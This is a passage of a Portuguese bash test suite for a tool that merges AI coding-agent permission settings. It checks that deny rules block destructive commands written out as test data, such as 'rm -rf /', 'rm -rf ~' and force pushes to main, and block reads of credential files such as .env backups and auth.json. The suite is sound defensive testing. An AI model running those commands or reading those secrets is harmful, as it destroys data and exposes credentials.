printf '%s' "$SAIDA_A" | grep >/dev/null -F -- '- Bash(git status:*)' && { echo "  FALHA avisou de allow que nada anula"; falhas=$((falhas+1)); } \
  || echo "  ok    não avisa de allow que nenhum ask anula"
SAIDA_A2="$(node "$MERGE" "$TEMPLATE" "$TMP/meu-allow.json" 2>&1)"
printf '%s' "$SAIDA_A2" | grep >/dev/null 'passa(m) a perguntar' && { echo "  FALHA repete o aviso na 2ª passada"; falhas=$((falhas+1)); } \
  || echo "  ok    2ª passada não repete o aviso"

for c in 'rm -rf .next' 'rm -rf node_modules' 'rm -rf dist' 'rm -r build'; do
  if casa ask Bash "$c" || casa deny Bash "$c"; then echo "  FALHA ask/deny novo pega: $c"; falhas=$((falhas+1))
  else echo "  ok    continua livre (acceptEdits aprova rm no projeto): $c"; fi
done
for c in 'Remove-Item .next -Recurse -Force' 'Remove-Item -Recurse -Force C:\\x' 'Remove-Item dist -r'; do
  if casa ask PowerShell "$c"; then echo "  ok    ask (PowerShell): $c"; else echo "  FALHA ask não pega (PowerShell): $c"; falhas=$((falhas+1)); fi
done
# Exceção única ao espelho (issue #270): a regra cujo binário vem por caminho POSIX
# (`Bash(/*/git …)`, `Bash(/*/supabase …)`, `Bash(/*/env …)`). No Windows o caminho absoluto
# começa pela letra do disco (`C:\…\git.exe`), e `PowerShell(/*/git …)` nunca casaria: seria
# regra morta. O que pega o caminho no PowerShell é o curinga `*supabase* login`, espelhado.
# `sudo` e `env` continuam espelhados: o Windows 11 24H2 traz o Sudo for Windows (desligado
# por padrão), e o `env *git…` já era espelhado antes.
SEM_ESPELHO="$(node -e '
const p = require(process.argv[1]).permissions
const n = (r) => r.replace(/:\*\)$/, " *)")
const posix = (r) => r.startsWith("Bash(/*/")
const falta = []
for (const l of ["deny", "ask"]) {
  const ps = new Set((p[l] || []).filter((r) => r.startsWith("PowerShell(")).map(n))
  for (const r of p[l] || []) if (r.startsWith("Bash(") && !posix(r) && !ps.has(n("PowerShell(" + r.slice(5)))) falta.push(l + ":" + r)
}
console.log(falta.join(" "))' "$TEMPLATE")"
[ -z "$SEM_ESPELHO" ] && echo "  ok    todo deny/ask de Bash tem o espelho PowerShell(...), fora o caminho POSIX" \
  || { echo "  FALHA sem espelho PowerShell: $SEM_ESPELHO"; falhas=$((falhas+1)); }
MORTA_PS="$(node -e 'const p = require(process.argv[1]).permissions
console.log([...(p.deny || []), ...(p.ask || [])].filter((r) => r.startsWith("PowerShell(/")).join(" "))' "$TEMPLATE")"
[ -z "$MORTA_PS" ] && echo "  ok    nenhuma regra PowerShell(/…) morta" \
  || { echo "  FALHA regra PowerShell por caminho POSIX (nunca casa no Windows): $MORTA_PS"; falhas=$((falhas+1)); }
for c in 'C:\tools\supabase.exe login' '& "C:\Users\x\AppData\Roaming\npm\vercel.cmd" login' \
         'sudo git push -f origin main' 'sudo npx supabase db push' 'env FOO=1 supabase link'; do
  if casa deny PowerShell "$c"; then echo "  ok    deny (PowerShell): $c"; else echo "  FALHA deny não pega (PowerShell): $c"; falhas=$((falhas+1)); fi
done
for c in 'C:\tools\supabase.exe db pull' 'sudo git push origin main' 'C:\tools\vercel.exe whoami'; do
  if casa deny PowerShell "$c"; then echo "  FALHA deny pega o legítimo (PowerShell): $c"; falhas=$((falhas+1)); else echo "  ok    deixa (PowerShell): $c"; fi
done
for proibida in 'Bash(*)' 'Bash' 'PowerShell(*)' 'PowerShell' 'Bash(node *)' 'Bash(python3 *)' 'Bash(bash *)' 'PowerShell(node *)'; do
  node -e 'process.exit(require(process.argv[1]).permissions.allow.includes(process.argv[2]) ? 1 : 0)' "$TEMPLATE" "$proibida" \
    && echo "  ok    allow não tem $proibida" || { echo "  FALHA allow genérico: $proibida"; falhas=$((falhas+1)); }
done
grep -q '"Write(' "$TEMPLATE" && { echo "  FALHA regra Write( no template (nunca é consultada; use Edit)"; falhas=$((falhas+1)); } \
  || echo "  ok    nenhuma regra Write("
node -e 'process.exit(require(process.argv[1]).permissions.allow.some(r=>r.startsWith("PowerShell(")) ? 0 : 1)' "$TEMPLATE" \
  && echo "  ok    allow tem regras PowerShell(...)" || { echo "  FALHA allow sem PowerShell"; falhas=$((falhas+1)); }

echo "== freio em bypass: force push em main/master e rm -rf em / ou ~ (#246, item 3) =="
# Em bypassPermissions os hooks se calam e o deny é o freio que sobra: pela doc, regra de deny
# que casa bloqueia "even in bypassPermissions mode". O freio é estreito: force push em
# main/master e `rm -rf` em `/`, `~` e `$HOME`. Cada caso `nega` tem ao lado o vizinho
# legítimo que precisa continuar livre.
# Composto: o deny vale quando qualquer subcomando casa (`&&`, `||`, `;`, `|`), e o CLI casa
# também a string inteira. O binário `env` não está entre os wrappers que o CLI tira antes de
# casar (`command`, `timeout`, `nice`…), então `env FOO=1 git push …` chega com o `env` na frente
# e só a família `Bash(env *git *push* …)` pega (time, VAMOO-AI/claude-config-team#381).
negado_cmd() {
  local c="$1" sub
  c=${c//'&&'/$'\n'}; c=${c//'||'/$'\n'}; c=${c//';'/$'\n'}; c=${c//'|'/$'\n'}
  while IFS= read -r sub; do
    sub="${sub#"${sub%%[![:space:]]*}"}"; sub="${sub%"${sub##*[![:space:]]}"}"
    [ -n "$sub" ] || continue
    negado "$sub" && return 0
  done <<< "$1"$'\n'"$c"
  return 1
}
nega_c()  { if negado_cmd "$1"; then echo "  ok    nega: $1"; else echo "  FALHA não nega: $1"; falhas=$((falhas+1)); fi; }
deixa_c() { if negado_cmd "$1"; then echo "  FALHA nega o legítimo: $1"; falhas=$((falhas+1)); else echo "  ok    deixa: $1"; fi; }
# O `sudo`, o caminho absoluto e o `/usr/bin/env` também não saem (issue #270): cada um tem a
# família própria, `Bash(sudo *git *push* …)`, `Bash(/*/git *push* …)` e `Bash(/*/env *git *push* …)`.
# O caminho é ancorado em `/`: com `/*git*`, o `*` engole a aspa de `grep -rn "git push …"`.
for pre in '' 'env FOO=1 ' 'env -i ' '/usr/bin/' '/opt/homebrew/bin/' 'sudo ' 'sudo -E ' '/usr/bin/env FOO=1 '; do
  for b in main master; do
    for c in "git push --force origin $b" "git push -f origin $b" "git push --force-with-lease origin $b" \
             "git push --force-with-lease=$b:abc123 origin $b" "git push origin --force $b" "git push origin +$b" \
             "git push origin $b --force" "git push origin $b -f" "git push origin $b --tags -f" \
             "git push -f origin HEAD:$b" "git push --force origin HEAD:$b" "git push origin +HEAD:$b" \
             "git push origin HEAD:$b --force" "git push origin HEAD:$b -f" "git -C /x/repo push --force origin $b" \
             "cd /x/repo && git push --force origin $b" "git push --force origin $b | cat"; do
      nega_c "${pre}$c"
    done
  done
  for c in 'git push origin main' 'git push -u origin main' 'git push --follow-tags origin main' \
           'git push origin main --follow-tags' 'git push --force origin feat/x' 'git push -f origin fix/main-menu' \
           'git push --force-with-lease origin feat/main' 'git push origin feat/x --force' 'git push origin domain-fix --force' \
           'git push --force origin maintenance' 'git push origin HEAD:feat/x --force' 'git push -f origin fix/main' \
           'git push origin +feat/main' 'git push --force origin HEAD:feat/main' 'git log --oneline main'; do
    deixa_c "${pre}$c"
  done
done
deixa_c 'echo git push --force origin main'
deixa_c "bash -c 'git push origin main'"
deixa_c '/usr/bin/grep -rn "git push --force origin main" docs'
deixa_c 'echo /git push -f origin main'
for c in 'rm -rf /' 'rm -fr /' 'rm -r -f /' 'rm -rf --no-preserve-root /' 'rm -rf / --no-preserve-root' \
         'rm -rf "/"' 'rm -rf ~' 'rm -rf ~/' 'rm -rf $HOME' 'rm -rf $HOME/' 'rm -rf "$HOME"' \
         'rm -rf "$HOME/"' 'rm -rf ${HOME}' 'rm -rf ${HOME}/' 'rm -rf "${HOME}"' 'rm -rf "${HOME}/"' \
         'rm -rf /tmp/x ~' 'cd /tmp && rm -rf ~'; do
  nega_c "$c"
done
for c in 'rm -rf /tmp/descartavel' 'rm -rf ./dist' 'rm -rf dist/ build/' 'rm -rf ~/tmp/descartavel' \
         'rm -rf ~/.cache/foo' 'rm -rf "$HOME/projetos/x/node_modules"' 'rm -rf $HOME/x' \
         'rm -rf ${HOME}/x' 'rm -f ~/.zcompdump' 'rm -rf "$TMP"' 'rm -rf .next' 'rm -rf node_modules'; do
  deixa_c "$c"
done
# O allow `Bash(git push *)` continua: o push normal segue sem pergunta, e no force push na
# main o deny vence o allow (ordem deny → ask → allow da doc).
casa allow Bash 'git push origin feat/x' && echo "  ok    allow Bash(git push *) continua no template" \
  || { echo "  FALHA o push normal saiu do allow"; falhas=$((falhas+1)); }
casa allow Bash 'git push --force origin main' && negado_cmd 'git push --force origin main' \
  && echo "  ok    force push na main casa o allow e o deny: o deny vence" \
  || { echo "  FALHA o caso deny-vence-allow não se monta"; falhas=$((falhas+1)); }
# Limite que nenhum glob resolve, registrado para não parecer coberto: `bash -c '…'` e
# `git push -f` sem refspec com a branch atual na main.

echo "== login, db push e link atrás de caminho absoluto, sudo e env (issue #270) =="
# Os mesmos wrappers do push: o binário por caminho (`/*/supabase`, `/*/vercel`, ancorado em
# `/`), o `sudo`, o `env` e o `/*/env`, cada um com o gêmeo sem o ` *` final. Os curingas
# `*supabase* login` e `*vercel* login` pegam o login sem argumento por qualquer caminho.
# Fora, por não ter forma ancorada que não pegue também a busca pela frase:
# `./node_modules/.bin/supabase …`, `~/.bun/bin/bunx …` e `/usr/local/bin/npx supabase …`.
for pre in '/opt/homebrew/bin/' '/usr/local/bin/' 'sudo ' 'sudo -E ' 'env FOO=1 ' 'env -i ' '/usr/bin/env FOO=1 '; do
  for c in 'supabase db push' 'supabase db push --linked' 'supabase link' 'supabase link --project-ref abc' \
           'supabase login' 'supabase login --token x' 'vercel login' 'vercel login --github'; do
    nega_c "${pre}$c"
  done
  for c in 'supabase db pull' 'supabase unlink' 'supabase functions deploy link-preview' 'vercel whoami' \
           'vercel deploy'; do
    deixa_c "${pre}$c"
  done
done
nega_c 'sudo npx supabase db push'
nega_c 'env SUPABASE_ACCESS_TOKEN=x npx supabase link --project-ref abc'
# shellcheck disable=SC2088  # o til literal é o comando como o CLI o recebe
nega_c '~/.local/bin/supabase login'
# A âncora em `/` e no literal deixa passar a busca pela frase, que os docs do kit contêm.
deixa_c '/usr/bin/grep -rn "supabase db push" docs'
deixa_c '/usr/bin/grep -rn "vercel login --github" docs'
deixa_c 'echo /supabase db push'
deixa_c 'echo supabase link --project-ref abc'

echo "== deny de leitura que passava pelo nome exato (#246, item 1) =="
# Read(): gitignore. `//` é a raiz e `~/` o home; `*` não atravessa `/` e `**` atravessa.
CASA_T=/home/teste
READ_P="$(node -e 'for (const e of require(process.argv[1]).permissions.deny) if (e.startsWith("Read(")) console.log(e.slice(5, -1))' "$TEMPLATE")"
read_negado() {
  local f="$1" p base pre
  while IFS= read -r p; do
    [ -n "$p" ] || continue
    case "$p" in
      '//**/'*)
        base=${p#'//**/'}
        case "$base" in */*) continue ;; esac
        # shellcheck disable=SC2254
        case "${f##*/}" in $base) return 0 ;; esac
        continue ;;
      '~/'*) pre="$CASA_T/${p#'~/'}" ;;
      '//'*) pre="/${p#'//'}" ;;
      *) continue ;;
    esac
    case "$pre" in
      *'/**') case "$f" in "${pre%/\*\*}"/*) return 0 ;; esac ;;
      *'/**/'*) # shellcheck disable=SC2254
         case "$f" in "${pre%%/\*\*/*}"/*) case "${f##*/}" in ${pre##*/}) return 0 ;; esac ;; esac ;;
      *) [ "${f%/*}" = "${pre%/*}" ] || continue
         # shellcheck disable=SC2254
         case "${f##*/}" in ${pre##*/}) return 0 ;; esac ;;
    esac
  done <<< "$READ_P"
  return 1
}
for f in /x/proj/.env.local.bak-1785263322 /x/proj/.env.production.bak /x/proj/.env.bak /x/proj/.env.bak-2026-10-08 \
         "$CASA_T/.claude/.env.tokens.bak-2026-10-08" /x/proj/.env.tokens /x/proj/.env.prod /x/proj/.env.dev /x/proj/.env.preview \
         "$CASA_T/.codex/auth.json" "$CASA_T/Library/Application Support/com.vercel.cli/auth.json" \
         "$CASA_T/Library/Application Support/com.vercel.cli/.auth.json.38107.1778616964077.tmp" \
         "$CASA_T/.local/share/com.vercel.cli/auth.json" "$CASA_T/AppData/Roaming/com.vercel.cli/Data/auth.json" \
         /x/proj/.env.local /x/proj/.env.production.local /x/proj/supabase/.env; do
  if read_negado "$f"; then echo "  ok    nega leitura: $f"; else echo "  FALHA não nega leitura: $f"; falhas=$((falhas+1)); fi
done
for f in /x/proj/.env.example /x/proj/.env.local.example /x/proj/.env.example.pt-BR /x/proj/.env.migracao.example \
         "$CASA_T/.codex/config.toml" "$CASA_T/Library/Application Support/com.vercel.cli/config.json" \
         "$CASA_T/AppData/Roaming/com.vercel.cli/Data/config.json" /x/proj/src/env.ts; do
  if read_negado "$f"; then echo "  FALHA nega leitura legítima: $f"; falhas=$((falhas+1)); else echo "  ok    deixa ler: $f"; fi
done

echo "== desktop-commander: tool MCP fora de todo hook (#246, item 2) =="
# Deny aceita glob no nome inteiro da tool, e a tool que casa sai do contexto (doc). O
# desktop-commander lê arquivo fora do deny de Read() e roda shell fora do matcher Bash.
TOOL_P="$(node -e 'for (const e of require(process.argv[1]).permissions.deny) if (/^[A-Za-z_*][^()]*$/.test(e)) console.log(e)' "$TEMPLATE")"
tool_negada() { local p; while IFS= read -r p; do [ -n "$p" ] || continue
  # shellcheck disable=SC2254
  case "$1" in $p) return 0 ;; esac; done <<< "$TOOL_P"; return 1; }
for t in start_process read_file get_file_info write_file interact_with_process; do
  tool_negada "mcp__plugin_desktop-commander_desktop-commander__$t" && echo "  ok    nega: desktop-commander $t" \
    || { echo "  FALHA não nega: desktop-commander $t"; falhas=$((falhas+1)); }
done
for t in mcp__claude-in-chrome__navigate mcp__plugin_outro_servidor__read_file Read; do
  tool_negada "$t" && { echo "  FALHA nega tool legítima: $t"; falhas=$((falhas+1)); } || echo "  ok    deixa: $t"
done

echo "== o deny novo chega a quem já tem o settings instalado =="
# Quem rodou o setup antes desta versão tem o deny antigo e o allow `Bash(git push *)`. O
# merge é união: todo deny do template precisa chegar, o allow fica e a 2ª passada não muda nada.
cat > "$TMP/instalado.json" <<'JSON'
{ "permissions": { "defaultMode": "auto",
  "allow": ["Bash(git push *)", "Bash(meu-script:*)"],
  "deny": ["Read(//**/.env)", "Read(//**/.env.tokens)", "Bash(npx *supabase* db push *)", "Bash(meu-deny:*)"] } }
JSON
node "$MERGE" "$TEMPLATE" "$TMP/instalado.json" >/dev/null 2>&1
FALTA_DENY="$(node -e '
const t = require(process.argv[1]).permissions.deny, u = require(process.argv[2]).permissions.deny
console.log(t.filter((r) => !u.includes(r)).join(" "))' "$TEMPLATE" "$TMP/instalado.json")"
[ -z "$FALTA_DENY" ] && echo "  ok    todo deny do template chega ao settings instalado" \
  || { echo "  FALHA deny do template não chegou: $FALTA_DENY"; falhas=$((falhas+1)); }
for r in 'Bash(npx *supabase* db push)' 'Bash(git *push* --force* main)' 'Bash(env *git *push* -f* main)' \
         'Bash(rm * ~)' 'Read(//**/.env.bak*)' 'mcp__plugin_desktop-commander_desktop-commander__*' 'Bash(meu-deny:*)'; do
  node -e 'process.exit(require(process.argv[1]).permissions.deny.includes(process.argv[2]) ? 0 : 1)' "$TMP/instalado.json" "$r" \
    && echo "  ok    deny no settings instalado: $r" || { echo "  FALHA falta no settings instalado: $r"; falhas=$((falhas+1)); }
done
for r in 'Bash(git push *)' 'Bash(meu-script:*)'; do
  node -e 'process.exit(require(process.argv[1]).permissions.allow.includes(process.argv[2]) ? 0 : 1)' "$TMP/instalado.json" "$r" \
    && echo "  ok    allow continua: $r" || { echo "  FALHA o merge tirou o allow $r"; falhas=$((falhas+1)); }
done
ANTES_I="$(cat "$TMP/instalado.json")"
node "$MERGE" "$TEMPLATE" "$TMP/instalado.json" >/dev/null 2>&1
[ "$ANTES_I" = "$(cat "$TMP/instalado.json")" ] && echo "  ok    2ª passada com o template não muda nada" \
  || { echo "  FALHA 2ª passada mudou o settings instalado"; falhas=$((falhas+1)); }

echo "== settings.json quebrado não pode ser sobrescrito =="
echo '{ isso não é json' > "$TMP/ruim.json"
node "$MERGE" "$TMP/kit.json" "$TMP/ruim.json" >/dev/null 2>&1
grep -q 'isso não é json' "$TMP/ruim.json" \
  && echo "  ok    arquivo inválido fica intacto" \
  || { echo "  FALHA o arquivo inválido foi sobrescrito"; falhas=$((falhas+1)); }
printf '{\n  "a": 1,\n}\n' > "$TMP/virgula.json"
SAIDA_V="$(node "$MERGE" "$TMP/kit.json" "$TMP/virgula.json" 2>&1)"
printf '%s' "$SAIDA_V" | grep >/dev/null 'linha 3, coluna 1' \
  && echo "  ok    o aviso de JSON inválido diz a linha do erro" \
  || { echo "  FALHA o aviso não diz onde está o erro: $SAIDA_V"; falhas=$((falhas+1)); }

echo "== settings.json vazio recebe o kit inteiro =="
: > "$TMP/vazio.json"
node "$MERGE" "$TMP/kit.json" "$TMP/vazio.json" >/dev/null 2>&1
node -e 'process.exit(require(process.argv[1]).language === "portuguese" ? 0 : 1)' "$TMP/vazio.json" 2>/dev/null \
  && echo "  ok    arquivo de 0 bytes vira {} e é mesclado" \
  || { echo "  FALHA arquivo vazio foi tratado como JSON inválido e ficou sem o kit"; falhas=$((falhas+1)); }

# ═══════════════════════════════════════════════════════════════════════════════════════════
# Casos portados do merge do kit do time (F6 do núcleo único, issue #241). O kit do time tem
# o seu `merge-settings.py`, que sai quando o `kit-setup.sh --overlay <dir>` o substituir; até
# lá, o que ele prova tem de valer aqui. As regras da casa (allow revogado, valor de env ou de
# chave que o kit gravou e tirou, hook a remover) não moram no .js: chegam pela meta-chave
# `$merge` do overlay, e o overlay daqui é uma fixture neutra.
#
# Três casos do time contradiziam casos do plugin. Decisão (23/10/2026): o padrão é o do
# plugin, e o do time é ligado pela configuração — chave escalar que o kit governa vem em
# `$merge.chavesGovernadas`; hook da pessoa fora do kit sai com `$merge.removerHooksAlheios`;
# settings.json inválido sai com rc != 0 só com `--estrito`. Seção "conflitos decididos".
# ═══════════════════════════════════════════════════════════════════════════════════════════
saida_tem() { # saida_tem <descrição> <arquivo> <texto fixo>
  if grep -qF -- "$3" "$2"; then echo "  ok    $1"; else echo "  FALHA $1: $(cat "$2")"; falhas=$((falhas+1)); fi
}
saida_sem() { # saida_sem <descrição> <arquivo> <texto fixo>
  if grep -qF -- "$3" "$2"; then echo "  FALHA $1: $(cat "$2")"; falhas=$((falhas+1)); else echo "  ok    $1"; fi
}
# jsmod <entrada> <saída> <corpo JS que altera d>: variação de fixture sem jq (o kit não exige jq).
jsmod() {
  node -e 'const d = JSON.parse(require("fs").readFileSync(0, "utf8")); (new Function("d", process.argv[1]))(d);
process.stdout.write(JSON.stringify(d, null, 2) + "\n")' "$3" < "$1" > "$2"
}
# merge_em <nome> <entrada> [flags…]: o merge grava no próprio arquivo, então cada variante
# trabalha numa cópia ($TMP/<nome>.json) e a saída do node vai para $TMP/<nome>.txt.
merge_em() {
  local nome="$1" entrada="$2"; shift 2
  cp "$entrada" "$TMP/$nome.json"
  node "$MERGE" "$TMP/kit-t.json" "$TMP/$nome.json" "$@" > "$TMP/$nome.txt" 2>&1
}

cat > "$TMP/kit-t.json" <<'JSON'
{
  "theme": "dark",
  "advisorModel": "opus",
  "skillListingBudgetFraction": 0.02,
  "modelSettings": { "modelo-a": { "effortLevel": "medium" } },
  "enabledPlugins": { "plug-a@mkt": true, "plug-novo@mkt": true },
  "skillOverrides": { "skill-nova-do-kit": "user-invocable-only", "skill-do-kit": "user-invocable-only" },
  "env": { "KIT_VAR_NOVA": "1", "ANTHROPIC_BASE_URL": "http://kit.local" },
  "permissions": {
    "allow": ["Bash(npx tsc:*)", "Bash(supabase:*)"],
    "defaultMode": "auto",
    "additionalDirectories": ["<<preencha>>"]
  },
  "hooks": {
    "PreToolUse": [
      { "matcher": "Bash", "hooks": [
        { "type": "command", "command": "bash $HOME/.claude/hooks/check-careful.sh" },
        { "type": "command", "command": "command -v rtk >/dev/null 2>&1 && rtk hook claude || exit 0" }
      ] }
    ]
  }
}
JSON
cat > "$TMP/mine-t.json" <<'JSON'
{
  "theme": "auto",
  "disableClaudeAiConnectors": true,
  "tui": "fullscreen",
  "modelSettings": {
    "modelo-b": { "effortLevel": "high" },
    "modelo-c": { "effortLevel": "xhigh" },
    "modelo-a": { "effortLevel": "high" }
  },
  "skillOverrides": {
    "skill-local": "user-invocable-only",
    "skill-local-2": "user-invocable-only",
    "skill-sumida": "user-invocable-only",
    "skill-do-kit": "disabled"
  },
  "enabledPlugins": { "plug-a@mkt": false },
  "env": { "ANTHROPIC_BASE_URL": "http://proxy.local", "DISABLE_TELEMETRY": "1", "SLASH_COMMAND_TOOL_CHAR_BUDGET": "16000" },
  "permissions": {
    "allow": ["Bash(git status:*)", "Bash(gh pr view:*)", "Bash(supabase:*)", "Bash(npx shadcn@latest:*)",
              "Bash(npx --yes shadcn@latest:*)", "Bash(npx shadcn@latest add button)", "Bash(npx tsx:*)",
              "Bash(npm run:*)", "Bash(npm run build:*)", "Bash(npm run lint)"],
    "deny": ["Read(**/.env)", "Bash(vercel login:*)"],
    "defaultMode": "bypassPermissions",
    "additionalDirectories": ["/tmp"]
  },
  "hooks": {
    "PreToolUse": [
      { "matcher": "Bash", "hooks": [
        { "type": "command", "command": "rtk hook claude" },
        { "type": "command", "command": "afplay /System/Library/Sounds/Glass.aiff &" }
      ] }
    ]
  }
}
JSON
# O que o kit do time gravou e tirou, como o overlay dele vai declarar. Nenhum desses valores
# está no .js: sem o overlay, o núcleo não sabe deles.
cat > "$TMP/regras-t.json" <<'JSON'
{ "$merge": {
  "allowsRevogados": {
    "Bash(npx shadcn@latest:*)": "Bash(npx shadcn@4.22.1:*)",
    "Bash(npx --yes shadcn@latest:*)": "Bash(npx --yes shadcn@4.22.1:*)",
    "Bash(npx tsx:*)": null, "Bash(npm run:*)": null, "Bash(npm run build:*)": null
  },
  "envDoKit": { "SLASH_COMMAND_TOOL_CHAR_BUDGET": "16000" },
  "chavesDoKit": { "autoCompactWindow": 200000 }
} }
JSON
# Onde as skills "existem": skill-local e skill-local-2 estão instaladas; skill-sumida não
# está em lugar nenhum. --skills-dir explícito para não depender do ~/.claude de quem roda.
mkdir -p "$TMP/skills-t/skill-local" "$TMP/skills-t/skill-local-2"
merge_em out-t "$TMP/mine-t.json" --overlay "$TMP/regras-t.json" --skills-dir "$TMP/skills-t"
O="$TMP/out-t.json"

echo "== portado do time: o que a regressão de 25/08 destruiu =="
check "deny do usuário sobrevive" "d.permissions.deny.includes('Bash(vercel login:*)')" "true" "$O"
check "deny mantém Read(**/.env)" "d.permissions.deny.includes('Read(**/.env)')" "true" "$O"
check "allow do usuário fica" "d.permissions.allow.includes('Bash(git status:*)')" "true" "$O"
check "allow não duplica entrada comum" "d.permissions.allow.filter((r) => r === 'Bash(supabase:*)').length" "1" "$O"
check "disableClaudeAiConnectors sobrevive" "d.disableClaudeAiConnectors" "true" "$O"
check "tui sobrevive" "d.tui" '"fullscreen"' "$O"
check "additionalDirectories preservado (o placeholder do kit não entra)" "d.permissions.additionalDirectories" '["/tmp"]' "$O"
check "defaultMode bypassPermissions da pessoa fica" "d.permissions.defaultMode" '"bypassPermissions"' "$O"
check "allow do kit entra" "d.permissions.allow.includes('Bash(npx tsc:*)')" "true" "$O"
check "advisorModel do kit entra" "d.advisorModel" '"opus"' "$O"

echo "== portado do time: env e enabledPlugins são união, a máquina vence o empate =="
check "env da máquina sobrevive" "d.env.ANTHROPIC_BASE_URL" '"http://proxy.local"' "$O"
check "kit não apaga a telemetria-off da máquina" "d.env.DISABLE_TELEMETRY" '"1"' "$O"
check "env novo do kit chega a quem já tem env" "d.env.KIT_VAR_NOVA" '"1"' "$O"
check "plugin desligado continua desligado" "d.enabledPlugins['plug-a@mkt']" "false" "$O"
check "plugin novo do kit entra" "d.enabledPlugins['plug-novo@mkt']" "true" "$O"

echo "== portado do time: skillOverrides — o kit governa as chaves dele, o resto fica se a skill existe =="
check "override da pessoa não é comido" "d.skillOverrides['skill-local']" '"user-invocable-only"' "$O"
check "override de skill do kit: o kit vence" "d.skillOverrides['skill-do-kit']" '"user-invocable-only"' "$O"
check "override morto cai (skill não existe em lugar nenhum)" "d.skillOverrides['skill-sumida']" "undefined" "$O"
check "skill nova do kit entra manual" "d.skillOverrides['skill-nova-do-kit']" '"user-invocable-only"' "$O"
check "skillOverrides: 2 do kit + 2 da pessoa, morto fora" "Object.keys(d.skillOverrides).length" "4" "$O"
saida_tem "aviso nomeia o override morto que caiu" "$TMP/out-t.txt" "override morto: skill-sumida"
# Sem --skills-dir o merge não sabe onde a skill mora: a do plugin fica no cache dele, fora de
# ~/.claude/skills. Descartar ali apagaria override legítimo de quem instalou.
merge_em out-sd "$TMP/mine-t.json"
check "sem --skills-dir nenhum override da pessoa é descartado" "d.skillOverrides['skill-sumida']" '"user-invocable-only"' "$TMP/out-sd.json"

echo "== portado do time: modelSettings — o kit manda no modelo dele, o resto é da pessoa =="
check "modelSettings: o kit manda no modelo dele, os outros da máquina ficam" \
  "JSON.stringify(d.modelSettings) === JSON.stringify({'modelo-b':{effortLevel:'high'},'modelo-c':{effortLevel:'xhigh'},'modelo-a':{effortLevel:'medium'}})" "true" "$O"
jsmod "$TMP/kit-t.json" "$TMP/kit-t-sem-model.json" 'delete d.modelSettings'
cp "$TMP/mine-t.json" "$TMP/out-sm.json"
node "$MERGE" "$TMP/kit-t-sem-model.json" "$TMP/out-sm.json" >/dev/null 2>&1
check "modelSettings: sem a chave no kit, a máquina fica intacta" \
  "JSON.stringify(d.modelSettings) === JSON.stringify({'modelo-b':{effortLevel:'high'},'modelo-c':{effortLevel:'xhigh'},'modelo-a':{effortLevel:'high'}})" "true" "$TMP/out-sm.json"
jsmod "$TMP/mine-t.json" "$TMP/mine-teto.json" 'd.modelSettings["modelo-a"].maxEffortLevel = "xhigh"'
merge_em out-teto "$TMP/mine-teto.json"
check "modelSettings: no modelo do kit, a chave que o kit não define fica" \
  "JSON.stringify(d.modelSettings['modelo-a'])" '"{\"effortLevel\":\"medium\",\"maxEffortLevel\":\"xhigh\"}"' "$TMP/out-teto.json"

echo "== portado do time: hooks do kit chegam a quem já tem hooks =="
check "hook do kit chega" "d.hooks.PreToolUse.flatMap((g) => g.hooks).some((h) => h.command === 'bash \$HOME/.claude/hooks/check-careful.sh')" "true" "$O"
check "rtk vem na forma guardada do kit, uma vez" \
  "d.hooks.PreToolUse.flatMap((g) => g.hooks).filter((h) => h.command.includes('command -v rtk >/dev/null 2>&1 && rtk hook claude || exit 0')).length" "1" "$O"

echo "== portado do time: allow que o kit gravou e tirou (lista vinda do overlay) =="
check "allow shadcn@latest gravado pelo kit sai" \
  "d.permissions.allow.filter((r) => r === 'Bash(npx shadcn@latest:*)' || r === 'Bash(npx --yes shadcn@latest:*)').length" "0" "$O"
check "allow exato da pessoa com shadcn@latest fica" "d.permissions.allow.includes('Bash(npx shadcn@latest add button)')" "true" "$O"
check "allows de execução que o kit gravou saem" \
  "d.permissions.allow.filter((r) => ['Bash(npx tsx:*)', 'Bash(npm run:*)', 'Bash(npm run build:*)'].includes(r)).length" "0" "$O"
check "allow estreito da pessoa (npm run lint) fica" "d.permissions.allow.includes('Bash(npm run lint)')" "true" "$O"
saida_tem "aviso nomeia o allow revogado sem substituto" "$TMP/out-t.txt" "Bash(npm run:*) (sem substituto"
saida_tem "aviso nomeia o substituto do allow revogado" "$TMP/out-t.txt" "Bash(npx shadcn@latest:*) (agora Bash(npx shadcn@4.22.1:*))"
check "a meta-chave \$merge do overlay não vaza para o settings.json" "'\$merge' in d" "false" "$O"

echo "== portado do time: env e chave que o kit gravou e tirou (valor exato, vindo do overlay) =="
check "budget: a env que o kit pôs sai da máquina" "d.env.SLASH_COMMAND_TOOL_CHAR_BUDGET" "undefined" "$O"
saida_sem "tirar a env que o kit pôs não gera aviso" "$TMP/out-t.txt" "SLASH_COMMAND_TOOL_CHAR_BUDGET"
jsmod "$TMP/mine-t.json" "$TMP/mine-budget.json" 'd.env.SLASH_COMMAND_TOOL_CHAR_BUDGET = "30000"'
merge_em out-budget "$TMP/mine-budget.json" --overlay "$TMP/regras-t.json"
check "budget: valor que a pessoa escolheu fica" "d.env.SLASH_COMMAND_TOOL_CHAR_BUDGET" '"30000"' "$TMP/out-budget.json"
if grep -qF 'SLASH_COMMAND_TOOL_CHAR_BUDGET' "$TMP/out-budget.txt" && grep -qF 'skillListingBudgetFraction' "$TMP/out-budget.txt"; then
  echo "  ok    aviso diz que a env da pessoa anula a fração"
else echo "  FALHA a env da pessoa anula a fração em silêncio: $(cat "$TMP/out-budget.txt")"; falhas=$((falhas+1)); fi
jsmod "$TMP/kit-t.json" "$TMP/kit-t-sem-env.json" 'delete d.env'
jsmod "$TMP/mine-t.json" "$TMP/out-so-budget.json" 'd.env = { SLASH_COMMAND_TOOL_CHAR_BUDGET: "16000" }'
node "$MERGE" "$TMP/kit-t-sem-env.json" "$TMP/out-so-budget.json" --overlay "$TMP/regras-t.json" >/dev/null 2>&1
check "budget: env que só tinha a do kit sai inteira" "'env' in d" "false" "$TMP/out-so-budget.json"
jsmod "$TMP/mine-t.json" "$TMP/mine-janela.json" 'd.autoCompactWindow = 200000'
merge_em out-janela "$TMP/mine-janela.json" --overlay "$TMP/regras-t.json"
check "janela: o valor que o kit pôs sai da máquina" "'autoCompactWindow' in d" "false" "$TMP/out-janela.json"
jsmod "$TMP/mine-t.json" "$TMP/mine-janela-p.json" 'd.autoCompactWindow = 500000'
merge_em out-janela-p "$TMP/mine-janela-p.json" --overlay "$TMP/regras-t.json"
check "janela: valor que a pessoa escolheu fica" "d.autoCompactWindow" "500000" "$TMP/out-janela-p.json"

echo "== portado do time: overlay (chave de topo troca a do kit, hooks se somam) =="
